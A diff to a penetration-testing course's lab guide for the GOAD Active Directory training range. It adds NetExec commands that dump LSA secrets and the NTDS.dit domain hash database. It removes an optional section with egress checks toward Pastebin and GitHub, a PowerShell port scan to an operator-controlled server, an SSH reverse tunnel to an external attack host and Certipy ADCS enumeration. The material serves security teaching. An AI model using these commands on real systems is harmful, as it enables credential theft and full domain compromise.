@@ -122,6 +122,65 @@ SAM Credential Dump
 ???+ warning "Password Reuse Finding"
     In the GOAD environment, you'll notice the Administrator hash is the same on both WINTERFELL (DC02) and CASTELBLACK (SRV02). This is a common real-world misconfiguration that enables easy lateral movement.
 
+#### LSA Secrets
+
+The Local Security Authority (LSA) holds secrets in memory on a system and is another great place to harvest credentials. This can be accomplished with the `--lsa` flag.
+
+```bash
+nxc smb 192.168.56.10-23 -u robb.stark -p sexywolfy --lsa
+```
+
+???- note "Command Options/Arguments Explained"
+    - `--lsa`: Dumps Local Security Authority (LSA) secrets from target systems
+    - Privilege requirement: Requires Domain Admin or Local Administrator access on the target system
+    - What LSA secrets contain: Cached domain credentials, service account passwords, auto-logon credentials, VPN passwords, and other sensitive data stored by Windows for authentication
+    - Attack value: LSA secrets often contain plaintext or reversibly encrypted passwords for service accounts, scheduled tasks, and cached domain logons
+    - Process: Extracts secrets from the LSASS (Local Security Authority Subsystem Service) process memory and registry
+    - Why valuable: Can reveal credentials not found in SAM, including domain account passwords used by services running on that machine
+
+#### NTDS.dit - Keys to the Kingdom
+
+Finally, with Domain Admin access, you can retrieve the NTDS file. The **NTDS file** (often called `ntds.dit`) is the heart of **Active Directory** on a Windows domain controller.
+
+```bash
+nxc smb 192.168.56.10-23 -u robb.stark -p sexywolfy --ntds
+```
+
+???- note "Command Options/Arguments Explained"
+    - `--ntds`: Dumps the NTDS.dit database from Domain Controllers
+    - Privilege requirement: Requires Domain Admin privileges to access the NTDS.dit file on domain controllers
+    - What NTDS.dit contains: The complete Active Directory database with ALL domain user account hashes, group memberships, computer accounts, security policies, and trust relationships
+    - Attack value: This is the "keys to the kingdom" - contains every domain credential including Domain Admins, Enterprise Admins, and all service accounts
+    - Extraction method: Uses Volume Shadow Copy Service (VSS) to create a snapshot and extract the normally locked NTDS.dit file
+    - Post-extraction: Hashes can be cracked offline or used immediately for pass-the-hash attacks to compromise the entire domain
+    - Impact: Complete domain compromise - with NTDS.dit, an attacker has persistent access even if all passwords are changed (until hashes are rotated)
+
+![NTDS dump showing domain account hashes](img/nxc_ntds.png){ width="70%" }
+///caption
+NTDS Credential Dump
+///
+
+Here's the simple breakdown:
+
+* Think of NTDS as **a giant database file**.
+* It stores all the important information about your network domain:
+
+    * **User accounts** (names, passwords — in hashed/encrypted form)
+    * **Groups** (who belongs where)
+    * **Computers** (machines that are joined to the domain)
+    * **Security info** (permissions, trust relationships, etc.)
+
+In other words, if Active Directory is like the phonebook and security guard for a company's network, the `ntds.dit` file is the **actual book** where all the names, numbers, and access rules are written down.
+
+???+ note "SAM vs LSA vs NTDS Comparison"
+    👉 In simple terms:
+
+    * **SAM** = local usernames + password hashes (per-machine)
+    * **LSA secrets** = cached credentials, service passwords, and keys that Windows uses behind the scenes
+    * **NTDS** = domain-wide usernames + password hashes (and more)
+
+Once you have more hashes, you can try cracking them with Hashcat to get even more accounts.
+
 ### Step A4: Pass-the-Hash - The Pivot
 
 Now for the **pivot**. We've harvested credentials from DC02 - let's use them to access a different machine (SRV02).
@@ -390,112 +449,6 @@ Understanding these techniques helps defenders detect and respond to compromise.
 
 ---
 
-## Optional: Other Operator Techniques
-
-???+ info "Optional"
-    This section covers additional techniques for students who want to explore further. These are not required for the core lab but represent real-world attack patterns.
-
-### Operator Pre-Checks
-
-Before pivoting externally or establishing C2, smart operators check what egress is allowed. From a compromised host, test:
-
-| Check | Why It Matters |
-|-------|----------------|
-| **Pastebin access** | Data exfiltration potential |
-| **Google login** | OAuth abuse, token theft |
-| **GitHub access** | Tool staging, PowerShell download cradles |
-| **External HTTP server** | File transfer via `python -m http.server` |
-
-```bash
-# Quick connectivity checks from compromised host
-curl -s https://pastebin.com > /dev/null && echo "Pastebin: OK" || echo "Pastebin: BLOCKED"
-curl -s https://github.com > /dev/null && echo "GitHub: OK" || echo "GitHub: BLOCKED"
-curl -s https://raw.githubusercontent.com > /dev/null && echo "GitHub Raw: OK" || echo "GitHub Raw: BLOCKED"
-```
-
-???+ tip "Why This Matters"
-    Content filtering and egress controls vary widely. Knowing what's allowed helps you choose appropriate exfil channels, tool staging methods, and C2 protocols.
-
-#### Egress Port Scanning (PowerShell)
-
-For a more comprehensive egress check, scan all TCP ports from a Windows host to an external server you control. The external server should be configured to respond as open on all ports (e.g., using `socat` or a similar listener).
-
-```powershell
-1..65535 | % {$test=new-object system.Net.Sockets.TcpClient; $wait = $test.beginConnect("YOUR_EGRESS_TEST_SERVER",$_,$null,$null); ($wait.asyncwaithandle.waitone(250,$false)); if($test.Connected){echo "$_ open"}else{echo "$_ closed"}} | select-string " " | Out-File -Encoding ascii tcp-port-status.txt
-get-content .\tcp-port-status.txt | select-string "open" | measure-object -Line
-```
-
-???- note "Command Options/Arguments Explained"
-    - `1..65535`: Iterate through all TCP ports
-    - `TcpClient.beginConnect`: Asynchronous connection attempt to each port
-    - `waitone(250,$false)`: 250ms timeout per port
-    - `YOUR_EGRESS_TEST_SERVER`: Replace with your external server configured to accept all ports
-    - Output: Creates `tcp-port-status.txt` with open/closed status, then counts open ports
-    - **Setup required**: Your external server must respond on all ports for accurate results (e.g., `socat` listening on all ports)
-
-???+ warning "Time Warning"
-    This scan takes a while to complete (65,535 ports at 250ms each = ~4.5 hours worst case). Consider scanning common egress ports first (80, 443, 8080, 8443) or running in the background.
-
-### SSH Reverse Tunnel for Proxychains
-
-When you need to route attack tools through a compromised host to reach internal networks, SSH reverse tunneling creates a SOCKS proxy:
-
-```bash
-ssh -i ~/.ssh/pivot -R 9050 root@YOUR_EXTERNAL_IP
-```
-
-???- note "Command Options/Arguments Explained"
-    - `-i ~/.ssh/pivot`: SSH private key for authentication
-    - `-R 9050`: Create a reverse SOCKS proxy on port 9050 on the remote server
-    - `root@YOUR_EXTERNAL_IP`: Your external attack infrastructure
-    - What happens: Traffic sent to port 9050 on your external server gets tunneled through the SSH connection and exits from the compromised host
-
-**Configure proxychains** to use the tunnel:
-
-```bash
-# Edit /etc/proxychains.conf
-# Add at the bottom:
-socks5 127.0.0.1 9050
-```
-
-Then run tools through the tunnel:
-
-```bash
-proxychains nxc smb 10.10.10.0/24 -u user -p password
-```
-
-???+ tip "Real-World Use Case"
-    You've compromised a workstation that can reach internal servers your attack box can't. SSH tunnel lets you run Impacket, NetExec, etc. from your machine while the traffic exits from the compromised host.
-
-### Certipy - AD Certificate Services
-
-???+ info "Exploration Only"
-    ADCS attacks require the `essos.local` domain which isn't part of the core class VMs. This section is for students who want to explore on their own.
-
-Active Directory Certificate Services (ADCS) is frequently misconfigured, leading to privilege escalation paths known as ESC1-ESC8.
-
-**Sample enumeration command**:
-
-```bash
-certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12
-```
-
-???- note "Command Options/Arguments Explained"
-    - `certipy find`: Enumerate certificate templates and CA configurations
-    - `-u khal.drogo@essos.local`: Domain credentials for authentication
-    - `-dc-ip 192.168.56.12`: Domain controller for the essos.local domain
-    - Output: JSON/text report identifying vulnerable certificate templates
-
-**Common ADCS escalation paths**:
-
-- **ESC1**: Misconfigured certificate templates allowing arbitrary SANs
-- **ESC4**: Vulnerable template ACLs allowing modification
-- **ESC8**: NTLM relay to AD CS HTTP endpoints
-
-For more information, see the [Certipy documentation](https://github.com/ly4k/Certipy).
-
----
-
 ## Lab Cleanup
 
 No specific cleanup is required beyond stopping running tools.
@@ -508,4 +461,8 @@ To practice again:
 
 ## What's Next?
 
-You've completed the core Day 2 labs and demonstrated pivoting and escalation techniques in an Active Directory environment. The optional labs cover additional tools like AD Miner and bonus VMs for extended practice.
+You've completed the core Day 2 labs and demonstrated pivoting and escalation techniques in an Active Directory environment. The optional labs offer extended learning:
+
+- **AD Miner** - Prettier Active Directory vulnerability assessment
+- **Bonus VMs** - Additional GOAD environment systems for self-directed practice
+- **Operator Techniques** - Egress testing, SSH tunneling, and ADCS attacks
